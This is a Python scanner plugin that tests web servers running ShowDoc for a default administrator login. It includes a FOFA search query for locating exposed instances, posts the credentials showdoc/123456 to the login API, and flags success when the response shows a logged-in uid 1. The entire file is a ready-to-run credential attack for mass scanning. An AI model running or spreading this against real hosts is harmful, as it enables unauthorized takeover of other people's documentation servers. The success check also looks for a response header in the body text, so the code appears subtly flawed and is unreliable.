#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'showdoc默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="ShowDoc"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/server/index.php?s=/api/user/login'
  data = 'username=showdoc&password=123456'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and '"username":"showdoc"' in res.text and '"uid":"1"' in res.text and '"error_code":0' in res.text and 'Set-Cookie:' in res.text:
      ret['huixian'] = data
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret